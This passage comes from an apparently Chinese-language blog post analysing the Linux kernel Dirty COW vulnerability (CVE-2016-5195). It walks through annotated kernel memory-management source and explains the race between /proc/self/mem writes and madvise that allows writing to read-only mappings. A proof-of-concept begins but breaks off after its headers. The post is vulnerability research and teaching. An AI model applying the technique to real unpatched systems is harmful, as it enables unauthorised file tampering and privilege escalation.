class="line"><span class="comment">			 */</span></span><br><span class="line">			vma = find_vma(mm, addr);</span><br><span class="line">			<span class="keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)</span><br><span class="line">				ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,</span><br><span class="line">							  len, write);</span><br><span class="line">			<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			bytes = ret;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			bytes = len;</span><br><span class="line">			offset = addr &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">			<span class="keyword">if</span> (bytes &gt; PAGE_SIZE-offset)</span><br><span class="line">				bytes = PAGE_SIZE-offset;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用 kmap 为获取到的页面建立临时映射，因为我们获取的是 page 结构体，需要映射到一个虚拟地址之后才能进行写入</span></span><br><span class="line">			maddr = kmap(page);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * 分两种情况：读/写</span></span><br><span class="line"><span class="comment">            * 内核将 read/write 的流程统一于 mm_rw() 函数中，这也是为什么上层函数是 &#x27;mem_rw&#x27; 而不是 &#x27;mem_read/mem_write&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">			<span class="keyword">if</span> (write) &#123;</span><br><span class="line">				copy_to_user_page(vma, page, addr,</span><br><span class="line">						  maddr + offset, buf, bytes); <span class="comment">// 向对应内存页写入数据</span></span><br><span class="line">				set_page_dirty_lock(page);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				copy_from_user_page(vma, page, addr,</span><br><span class="line">						    buf, maddr + offset, bytes); <span class="comment">// 从对应内存页读取数据</span></span><br><span class="line">			&#125;</span><br><span class="line">			kunmap(page);</span><br><span class="line">			page_cache_release(page);</span><br><span class="line">		&#125;</span><br><span class="line">		len -= bytes;</span><br><span class="line">		buf += bytes;</span><br><span class="line">		addr += bytes;</span><br><span class="line">	&#125;</span><br><span class="line">	up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> buf - old_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么这个函数主要就分如下几步：</p>
<ul>
<li>通过 <code>get_user_pages()</code> 获取到对应的内存页（注意这里获取的是 <code>page</code> 结构体，因为该物理页不一定有映射）</li>
<li>通过 <code>kmap()</code> 或许到该内存页映射到的虚拟地址（若无则会建立新的临时映射）</li>
<li>通过 <code>copy_from_user_page()/copy_to_user_page()</code> 读&#x2F;写对应的内存页</li>
</ul>
<p>我们在这里主要关注点在写之前——该函数使用 <code>get_user_pages()</code> 获取对应的内存页，主要还是套娃，其会调用 <code>__get_user_pages_locked()</code> ，该函数最终调用 <code>__get_user_pages()</code>，定义于 <code>mm/gup.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里应当有一大段注释...自己去看源码啦！</span></span><br><span class="line"><span class="type">long</span> __get_user_pages(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> mm_struct *mm,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> start, <span class="type">unsigned</span> <span class="type">long</span> nr_pages,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> gup_flags, <span class="keyword">struct</span> page **pages,</span><br><span class="line">		<span class="keyword">struct</span> vm_area_struct **vmas, <span class="type">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> page_mask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If FOLL_FORCE is set then do not force a full fault as the hinting</span></span><br><span class="line"><span class="comment">	 * fault information is unrelated to the reference behaviour of a task</span></span><br><span class="line"><span class="comment">	 * using the address space</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))</span><br><span class="line">		gup_flags |= FOLL_NUMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> foll_flags = gup_flags;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> page_increm;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* first iteration or cross vma bound */</span></span><br><span class="line">		<span class="keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;</span><br><span class="line">			vma = find_extend_vma(mm, start);</span><br><span class="line">			<span class="keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;</span><br><span class="line">				<span class="type">int</span> ret;</span><br><span class="line">				ret = get_gate_page(mm, start &amp; PAGE_MASK,</span><br><span class="line">						gup_flags, &amp;vma,</span><br><span class="line">						pages ? &amp;pages[i] : <span class="literal">NULL</span>);</span><br><span class="line">				<span class="keyword">if</span> (ret)</span><br><span class="line">					<span class="keyword">return</span> i ? : ret;</span><br><span class="line">				page_mask = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))</span><br><span class="line">				<span class="keyword">return</span> i ? : -EFAULT;</span><br><span class="line">			<span class="keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;</span><br><span class="line">				i = follow_hugetlb_page(mm, vma, pages, vmas,</span><br><span class="line">						&amp;start, &amp;nr_pages, i,</span><br><span class="line">						gup_flags);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">retry:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span></span><br><span class="line"><span class="comment">		 * potentially allocating memory.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched();</span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<span class="comment">// 获取虚拟地址对应的物理页（page结构体）</span></span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;<span class="comment">// 失败了</span></span><br><span class="line">            		<span class="comment">/*</span></span><br><span class="line"><span class="comment">            		/* 两种原因：</span></span><br><span class="line"><span class="comment">            		* (1) 不存在对应的物理页（未与物理页见建立相应的映射关系）</span></span><br><span class="line"><span class="comment">            		* (2) 存在这样的物理页，但是没有相应的操作权限（如该页不可写）</span></span><br><span class="line"><span class="comment">            		* 在 COW 流程中会先走(1)，然后走(2)</span></span><br><span class="line"><span class="comment">            		*/</span></span><br><span class="line">			<span class="type">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">					nonblocking);<span class="comment">//【核心】处理缺页异常</span></span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;<span class="comment">//成功处理缺页异常，回去重新尝试调页</span></span><br><span class="line">			<span class="keyword">case</span> -EFAULT:</span><br><span class="line">			<span class="keyword">case</span> -ENOMEM:</span><br><span class="line">			<span class="keyword">case</span> -EHWPOISON:</span><br><span class="line">				<span class="keyword">return</span> i ? i : ret;</span><br><span class="line">			<span class="keyword">case</span> -EBUSY:</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			<span class="keyword">case</span> -ENOENT:</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line">			BUG();</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Proper page table entry exists, but no corresponding</span></span><br><span class="line"><span class="comment">			 * struct page.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">goto</span> next_page;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(page)) &#123;</span><br><span class="line">			<span class="keyword">return</span> i ? i : PTR_ERR(page);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (pages) &#123;</span><br><span class="line">			pages[i] = page;</span><br><span class="line">			flush_anon_page(vma, page, start);</span><br><span class="line">			flush_dcache_page(page);</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">next_page:</span><br><span class="line">		<span class="keyword">if</span> (vmas) &#123;</span><br><span class="line">			vmas[i] = vma;</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		page_increm = <span class="number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);</span><br><span class="line">		<span class="keyword">if</span> (page_increm &gt; nr_pages)</span><br><span class="line">			page_increm = nr_pages;</span><br><span class="line">		i += page_increm;</span><br><span class="line">		start += page_increm * PAGE_SIZE;</span><br><span class="line">		nr_pages -= page_increm;</span><br><span class="line">	&#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure>

<p>COW的两个要点：</p>
<ul>
<li>在我们第一次尝试访问某个内存页时，由于延迟绑定机制，Linux尚未建立起该页与对应物理页间的映射，此时 <code>follow_page_mask()</code> 返回 NULL；由于没获取到对应内存页，接下来调用 <code>faultin_page()</code> 函数解决缺页异常，分配物理页</li>
<li>调用 <code>faultin_page()</code> 函数成功解决缺页异常之后会回到 <code>retry</code> 标签，接下来会重新调用 <code>follow_page_mask()</code> ，而若是当前进程对于该页没有写权限（二级页表标记为不可写），则还是会返回NULL；由于没获取到对应内存页，接下来调用 <code>faultin_page()</code> 函数解决缺页异常，进行写时复制</li>
</ul>
<p>到了这里，<code>mem_rw()</code> 大致的流程便一目了然了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mem_rw()</span><br><span class="line">	__get_free_page()//获取空闲页，将要写入的数据进行拷贝</span><br><span class="line">	access_remote_vm()</span><br><span class="line">		__access_remote_vm()// 写入数据，执行 write 这一系统调用的核心功能</span><br><span class="line">			get_user_pages()</span><br><span class="line">				__get_user_pages_locked()</span><br><span class="line">					__get_user_pages()//获取对应的用户进程的内存页</span><br><span class="line">						follow_page_mask()//调内存页的核心函数</span><br><span class="line">						faultin_page()//解决缺页异常</span><br></pre></td></tr></table></figure>

<p>接下来来到缺页异常的处理函数 <code>faultin_page()</code> 的流程。</p>
<h3 id="第一次触发缺页异常"><a href="#第一次触发缺页异常" class="headerlink" title="第一次触发缺页异常"></a>第一次触发缺页异常</h3><p>由于 Linux 的延迟绑定机制，在第一次访问某个内存页之前 Linux kernel 并不会为其分配物理页，于是我们没法获取到对应的页表项， <code>follow_page_mask()</code> 返回 NULL，此时便会进入 <code>faultin_page()</code> 函数处理缺页异常，该函数定义于 <code>mm/gup.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">faultin_page</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">unsigned</span> <span class="type">int</span> *flags, <span class="type">int</span> *nonblocking)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> fault_flags = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* mlock all present pages, but do not fault in new pages */</span></span><br><span class="line">	<span class="keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="comment">/* For mm_populate(), just skip the stack guard page. */</span></span><br><span class="line">	<span class="keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;</span><br><span class="line">			(stack_guard_page_start(vma, address) ||</span><br><span class="line">			 stack_guard_page_end(vma, address + PAGE_SIZE)))</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_WRITE)<span class="comment">//因为我们要写入该页，所以该标志位存在</span></span><br><span class="line">		fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">	<span class="keyword">if</span> (nonblocking)</span><br><span class="line">		fault_flags |= FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_NOWAIT)</span><br><span class="line">		fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;</span><br><span class="line">		VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);</span><br><span class="line">		fault_flags |= FAULT_FLAG_TRIED;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = handle_mm_fault(mm, vma, address, fault_flags);<span class="comment">//分配内存页</span></span><br><span class="line">	<span class="keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; VM_FAULT_OOM)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))</span><br><span class="line">			<span class="keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		BUG();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tsk) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; VM_FAULT_MAJOR)</span><br><span class="line">			tsk-&gt;maj_flt++;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			tsk-&gt;min_flt++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nonblocking)</span><br><span class="line">			*nonblocking = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment">	 * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment">	 * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment">	 * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment">	 * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment">	 * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment">	 * reCOWed by userspace write).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<span class="comment">//第二次缺页异常会走到这里，清除 FOLL_WRITE 标志位</span></span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致的调用流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">faultin_page()</span><br><span class="line">    handle_mm_fault()</span><br><span class="line">        __handle_mm_fault()</span><br><span class="line">            handle_pte_fault()//发现pte为空，第一次访问该页</span><br><span class="line">                do_fault()//非匿名页，直接调入</span><br><span class="line">                    do_cow_fault()//我们要写入该页，所以走到了这里</span><br><span class="line">                    	do_set_pte()</span><br><span class="line">                            maybe_mkwrite()</span><br><span class="line">                                pte_mkdirty()//将该页标脏</span><br></pre></td></tr></table></figure>

<p>之后该页被调入主存中，但是此时我们并无对该页的写权限</p>
<h3 id="第二次触发缺页异常"><a href="#第二次触发缺页异常" class="headerlink" title="第二次触发缺页异常"></a>第二次触发缺页异常</h3><p>虽然我们成功调入了内存页，但是由于我们对该页并无写权限， <code>follow_page_mask()</code> 依旧会返回 NULL ，再次触发缺页异常，于是我们再次进入 <code>faultin_page()</code> 函数，来到了<strong>「写时复制」</strong>的流程，细节在前面已经分析过了，这里便不再赘叙</p>
<p>由于这一次成功获取到了一个可写的内存页，此时 <code>faultin_page()</code> 函数会清除 <code>foll_flags</code> 的 <code>FOLL_WRITE</code> 标志位</p>
<p>大致流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">faultin_page()</span><br><span class="line">    handle_mm_fault()</span><br><span class="line">        __handle_mm_fault()</span><br><span class="line">            handle_pte_fault()</span><br><span class="line">                do_wp_page()</span><br><span class="line">                	reuse_swap_page(old_page)</span><br><span class="line">                		wp_page_reuse()</span><br></pre></td></tr></table></figure>

<p>接下来的流程最终回到 <code>__get_user_pages()</code> 的 retry 标签，<strong>第三次</strong>尝试获取内存页，此时 <code>foll_flags</code> 的 <code>FOLL_WRITE</code> 标志位已经被清除，<strong>内核认为该页可写</strong>，于是 <code>follow_page_mask()</code> 函数成功获取到该内存页，接下来便是常规的写入流程， COW 结束</p>
<h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>既然CVE-2016-5195俗称<strong>「dirtyCOW」</strong>，毫无疑问漏洞出现在 COW 的过程当中，现在让我们来重新审视整个 COW 的过程</p>
<h3 id="多线程竞争"><a href="#多线程竞争" class="headerlink" title="多线程竞争"></a>多线程竞争</h3><p>我们在通过 <code>follow_page_mask()</code> 函数获取对应的内存页之前，用以判断该内存页是否可写的逻辑是根据 <code>foll_flags</code> 的 <code>FOLL_WRITE</code> 标志位进行判断的，但是决定 从该内存页读出数据&#x2F;向该内存页写入数据 则是由传入给 <code>mem_rw()</code> 函数的参数 <code>write</code> 决定的</p>
<p>我们来思考如下竞争过程，假如我们启动了两个线程：</p>
<ul>
<li>[1] 第一个线程尝试向<strong>「仅具有读权限的mmap映射区域写入内容」</strong>，此时便会触发缺页异常，进入到写时复制（COW）的流程当中</li>
<li>[2] 第二个线程使用 <code>madvise()</code> 函数通知内核<strong>「第一个线程要写入的那块区域标为未使用」</strong>，此时由 COW 分配得到的新内存页将会被再次调出</li>
</ul>
<h3 id="四次获取内存页-amp-三次缺页异常"><a href="#四次获取内存页-amp-三次缺页异常" class="headerlink" title="四次获取内存页 &amp; 三次缺页异常"></a>四次获取内存页 &amp; 三次缺页异常</h3><p>我们不难想到的是，既然这两个线程跑在竞争态，在第一个线程走完两次缺页异常的流程之后，若是第二个线程调用 madvise() 将页表项中的该页再次调出，<strong>第一个线程在第三次尝试获取内存页时便无法获取到内存页，便会再次触发缺页异常</strong>，接下来进入到 <code>faultin_page()</code> 的流程获取原内存页</p>
<p>而 <code>__get_user_pages()</code> 函数中 <code>foll_flags</code> 的 <code>FOLL_WRITE</code> 标志位已经<strong>在第二次尝试获取内存页、第二次触发缺页异常</strong>被清除， 此时该函数 <strong>第四次尝试获取内存页</strong>，由于不存在标志位的冲突，<strong>便可以 “正常” 获取到内存页</strong></p>
<p>接下来便回到了 <code>mem_rw()</code>的写流程，此时我们便成功绕过了 <code>foll_flags</code>对于读写的检测，成功获取到只有读权限的内存页，<strong>完成越权写</strong></p>
<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>有了以上思路，我们的 POC 并不算特别难写，<strong>开两个线程来竞争</strong>即可</p>
<p>我们先通过 mmap 以只读权限映射一个文件，随后尝试通过 <code>/proc/self/mem</code> 文件直接向进程的对应内存区域写入，这样便可以无视 mmap 设定的权限进行写入，从而触发 COW</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>完整 POC 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * CVE-2016-5195</span></span><br><span class="line"><span class="comment"> * dirty C-O-W</span></span><br><span class="line"><span class="comment"> * poc by arttnba3</span></span><br><span class="line"><span class="comment"> * 2021.4.14</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">dst_st</span>, <span class="title">fk_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_content;</span><br><span class="line"></span><br><span class="line"><span 